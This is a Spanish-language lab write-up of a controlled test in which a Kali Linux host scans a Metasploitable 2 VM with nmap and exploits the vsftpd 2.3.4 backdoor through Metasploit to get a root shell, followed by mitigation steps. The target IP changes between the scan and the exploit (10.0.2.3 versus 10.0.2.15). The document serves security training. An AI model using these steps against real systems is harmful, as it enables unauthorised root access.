# Laboratorio: Análisis de Vulnerabilidades en Entorno Controlado

## 1. Descripción del Entorno
* **Sistema Atacante:** Kali Linux
* **Sistema Objetivo:** Metasploitable 2 (máquina virtual vulnerable)
* **Objetivo:** Identificar puertos abiertos y servicios obsoletos explotables.

## 2. Fase de Reconocimiento (Nmap)
Ejecuté un escaneo agresivo para detectar versiones de servicios:
![Captura de pantalla del escaneo de Nmap](nmap.png)

`nmap -sV -p 21,22,80,445 10.0.2.3`

**Resultados clave:**
* Puerto 21 (FTP) abierto corriendo vsftpd 2.3.4.
* Puerto 22 (SSH) abierto.

## 3. Análisis y Explotación (Metasploit)
Utilicé el framework Metasploit para verificar si la versión de vsftpd era vulnerable al backdoor conocido.
* `use exploit/unix/ftp/vsftpd_234_backdoor`
![Captura de pantalla del uso de msfconsole](msfconsole.png)

* `set RHOSTS 10.0.2.15`
* `run`

**Resultado:** Acceso exitoso a la terminal con privilegios de root.
![Captura de pantalla de acceso](run_exploit.png)

## 4. Plan de Mitigación (Remediación)
1. Actualizar el servicio FTP a la versión más reciente y segura.
2. Deshabilitar el acceso FTP si no es estrictamente necesario y reemplazarlo por SFTP (puerto 22).
3. Configurar un firewall (iptables/UFW) para bloquear conexiones no autorizadas.
